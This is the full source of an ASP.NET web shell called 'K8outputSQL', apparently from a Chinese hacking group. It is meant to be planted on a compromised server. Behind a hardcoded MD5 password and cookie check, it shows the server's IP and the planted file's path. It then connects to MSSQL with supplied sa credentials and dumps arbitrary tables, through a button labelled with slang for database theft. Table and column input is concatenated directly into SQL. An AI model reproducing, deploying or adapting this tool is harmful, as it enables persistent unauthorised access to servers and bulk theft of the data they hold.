<%@ Page Language="C#" %>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="System.Data"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    public string k8pwd = "65238bb6d24e94e7d844ca97e8a541e1";//K8team
    public string k8yes = "K8outsql";
    string K8connString = null;
    SqlConnection K8conn = null;
    string k8sql = null;
    protected void K8loginChk(object sender, EventArgs e)
    {
        string k8pass = FormsAuthentication.HashPasswordForStoringInConfigFile(K8txtpass.Text, "MD5").ToLower();
        if (k8pass == k8pwd)
        {
            Response.Cookies.Add(new HttpCookie(k8yes, k8pwd));
            K8loginOK();
        }
        else
        {
            K8loginNO();       
        }
    }
    /// <summary>
    /// K8登陆失败
    /// </summary>
    private void K8loginNO()
    {
        K8login.Visible = true;
        K8outsqlmain.Visible = false;
        K8dataGridView.Visible = false;
    }
    /// <summary>
    /// K8登陆成功
    /// </summary>
    private void K8loginOK()
    {
        K8login.Visible = false;
        K8outsqlmain.Visible = true;
        K8dataGridView.Visible = true; 
        lblK8serverIP.Text = Request.ServerVariables["LOCAL_ADDR"].ToString();
        lblK8host.Text = Request.ServerVariables["SERVER_NAME"].ToString();
        lblServerPath.Text = "马路径: "+Server.MapPath(".");
        lblK8status.Text = "登陆成功!";
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.Cookies[k8yes] == null || Request.Cookies[k8yes].Value != k8pwd)
        {
            K8loginNO(); 
        }
        else
        {
             K8loginOK();
        }
    }

    protected void k8exit_Click(object sender, EventArgs e)
    {
        //清空Cookie
        Session.Abandon();
        Response.Cookies.Add(new HttpCookie(k8yes, null));
        K8login.Visible = true;
        K8outsqlmain.Visible = false;
    }

    protected void btnK8view_Click(object sender, EventArgs e)
    {
        try
        {
            K8connMSSQL();            
            string k8sql = "select top 20 * from " + this.txt_Table.Text.Trim();
            SqlCommand K8Ins = new SqlCommand(k8sql, K8conn);
            SqlDataReader k8show = K8Ins.ExecuteReader();
            K8dataGridView.DataSource = k8show;
            K8dataGridView.DataBind();
            lblK8status.Text =txt_Table.Text+ " 表中的20行记录!";
            K8conn.Close(); 
        }
        catch (Exception k8)
        {
            lblK8status.Text = k8.Message;
        }
    }

    
    protected void btnK8conn_Click(object sender, EventArgs e)
    {
        K8connMSSQL();
        K8conn.Close();        
    }
    /// <summary>
    /// K8连接MSSQL
    /// </summary>
    private void K8connMSSQL()
    {
        K8connString = "server=" + this.txt_SQLserver.Text.Trim() + ";database=" + this.txt_Database.Text.Trim() + ";uid=" + this.txt_SaUser.Text.Trim() + ";pwd=" + this.txt_Pass.Text.Trim();
        K8conn = new SqlConnection(K8connString);
        try
        {
            K8conn.Open();
            lblK8status.Text = "连接成功!";
        }
        catch (Exception k8)
        {
            lblK8status.Text = k8.Message;
        }
    }
    protected void btnK8outSQL_Click(object sender, EventArgs e)
    {
        try
        {
            K8connMSSQL();
            if (txt_Columns.Text == "")
            {
                txt_Columns.Text = "*";
            }
            k8sql = "select " + txt_Columns.Text + " from " + this.txt_Table.Text.Trim();
            SqlCommand K8Ins = new SqlCommand(k8sql, K8conn);
            SqlDataReader k8show = K8Ins.ExecuteReader();
            K8dataGridView.DataSource = k8show;
            K8dataGridView.DataBind();
            lblK8status.Text = "导出完毕!";
            K8conn.Close();
        }
        catch (Exception k8)
        {
            lblK8status.Text = k8.Message;
        }
    }
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>K8outputSQL V1.0</title>
    <style type="text/css">
        body, td
        {
            font: 12px Tahoma,Arial;
            line-height: 16px;
            background-color: #003300;
            color: lime;
        }
        .K8_Text_Style
        {
            font-size: 12px;
            margin: 5px 0px 0px 5px;
            font-family: Tahoma;
            color: lime;
            text-align: center;
            background-color: #003300;
            border: 1px solid lime;
        }
        .K8_Button_Style
        {
            font-size: 12px;
            margin: 5px 0px 0px 0px;
            font-family: Tahoma;
            background-color: #003300;
            color: lime;
            border: 1px solid lime;
            }
        a
        {
            color: lime;
            text-decoration: none;
        }
        .style2
        {
            width: 506px;
            border: 1px solid #006600;
        }
        .style5
        {
            height: 13px;
            border: 1px solid #006600;
        }
                
        .style8
        {
            height: 13px;
            width: 9px;
            border: 1px solid #006600;
        }
        .style11
        {
            width: 140px;
            height: 13px;
            border: 1px solid #006600;
        }
        .style12
        {
            height: 20px;
        }
        .style14
        {
            height: 13px;
            border: 1px solid #006600;
            width: 150px;
        }
        .style15
        {
            height: 20px;
            border: 1px solid #006600;
        }
        .style16
        {
            height: 8px;
            border: 1px solid #006600;
            width: 150px;
        }
        .style17
        {
            width: 140px;
            height: 8px;
            border: 1px solid #006600;
        }
        .style18
        {
            height: 8px;
            width: 9px;
            border: 1px solid #006600;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">
    <div align="center" id="K8Main">
        <p style="text-align: center; line-height: 41px; font-family: 华文彩云; font-size: 35px; height: 12px; margin-top: 0px;">
            K8output SQL 1.0
        </p>
        <div id="K8login" runat="server" style="border: 1px solid #006600; margin: 20px auto;
            width: 300px;" enableviewstate="false" visible="true">
            <span style="font: 11px; margin-top: 5px;">Password:</span>
            <asp:TextBox ID="K8txtpass" runat="server" Columns="20" CssClass="K8_Text_Style"
                Width="100px" TextMode="Password"></asp:TextBox>
            <asp:Button ID="K8chk" runat="server" Text="Crack8_Login" CssClass="K8_Button_Style"
                OnClick="K8loginChk" Width="87px" BorderColor="Lime" />
            <p style="width: 300px" />
            Copyright &copy; 2011 - <a href="http://qqhack8.blog.163.com" target="_blank">http://qqhack8.blog.163.com</a>
        </div>
        <div align="center" id="K8outsqlmain" runat="server" enableviewstate="false" visible="false">
            <table align="center" class="style2" cellpadding="0" cellspacing="0">
                <tr>
                    <td align="left" class="style12" colspan="4">
                        <span style="float: right; margin-left: 7px;"><a href="http://qqhack8.blog.163.com"
                            target="_blank">Crack8编程小组[K.8] 欢迎您!</a>&nbsp; </span><span id="Bin_Span_Sname" runat="server"
                                enableviewstate="true">&nbsp;<asp:LinkButton ID="k8exit" runat="server" Text="退出"
                                    OnClick="k8exit_Click"></asp:LinkButton>
                                | 
                        <asp:Label ID="lblK8serverIP" runat="server" Text="k8serverIP"></asp:Label>
                        (<asp:Label ID="lblK8host" runat="server" Text="K8host"></asp:Label>
                        )</span></td>
                </tr>
                <tr>
                    <td class="style15" align="left" colspan="4">
                        <asp:Label ID="lblServerPath" runat="server" Text="马路径:"></asp:Label>
                    </td>
                    <tr>
                    <td class="style16" align="left">
                        服务器:<asp:TextBox 
                            ID="txt_SQLserver" runat="server" Columns="20" CssClass="K8_Text_Style"
                            Width="100px">K8DESK-PC\K8SQLEXPRESS</asp:TextBox>
                    </td>
                    <td class="style17" align="left">
                        用户:<asp:TextBox 
                            ID="txt_SaUser" runat="server" Columns="20" CssClass="K8_Text_Style"
                            Width="100px">sa</asp:TextBox>
                    </td>
                    <td class="style17" align="left">
                        密码:<asp:TextBox 
                            ID="txt_Pass" runat="server" Columns="20" CssClass="K8_Text_Style"
                            Width="100px">k8team</asp:TextBox>
                    </td>
                    <td class="style18" align="center">
                        <asp:Button ID="btnK8conn" runat="server" Text="测试" CssClass="K8_Button_Style"
                            Width="39px" BorderColor="Lime" onclick="btnK8conn_Click" />
                </tr>
                <tr>
                    <td class="style14" align="left">
                        数据库:<asp:TextBox ID="txt_Database" runat="server" 
                            Columns="20" CssClass="K8_Text_Style"
                            Width="100px">k8sql</asp:TextBox>
                    </td>
                    <td class="style11" align="left">
                        表名:<asp:TextBox 
                            ID="txt_Table" runat="server" Columns="20" CssClass="K8_Text_Style"
                            Width="100px">s</asp:TextBox>
                    </td>
                    <td class="style11" align="left">
                        行数:<asp:TextBox 
                            ID="txt_DataRows" runat="server" Columns="20" CssClass="K8_Text_Style"
                            Width="100px"></asp:TextBox>
                    </td>
                    <td class="style8" align="center">
                        <asp:Button ID="btnK8view" runat="server" Text="查看" CssClass="K8_Button_Style" OnClick="btnK8view_Click"
                            Width="39px" BorderColor="Lime" />
                </tr>
                <tr>
                    <td class="style5" colspan="3" align="left">
                        指定列:<asp:TextBox 
                            ID="txt_Columns" runat="server" Columns="20" CssClass="K8_Text_Style"
                            Width="398px">*</asp:TextBox>
                    </td>
                    <td class="style8" align="center">
                        <asp:Button ID="btnK8outSQL" runat="server" Text="脱裤" 
                            CssClass="K8_Button_Style" OnClick="btnK8outSQL_Click"
                            Width="39px" BorderColor="Lime" />
                </tr>
                <tr>
                    <td class="style15" colspan="4" align="center">
                        <asp:Label ID="lblK8status" runat="server" Text="K8status"></asp:Label>
                    </td>
                    </table>
        </div>
        <div id="K8viewData" runat="server" enableviewstate="false" visible="true">
            <asp:GridView ID="K8dataGridView" runat="server" BorderColor="#006600" 
                Height="135px" Width="507px" CellPadding="0">
            </asp:GridView>
        </div>
    </div>
    </form>
</body>
</html>
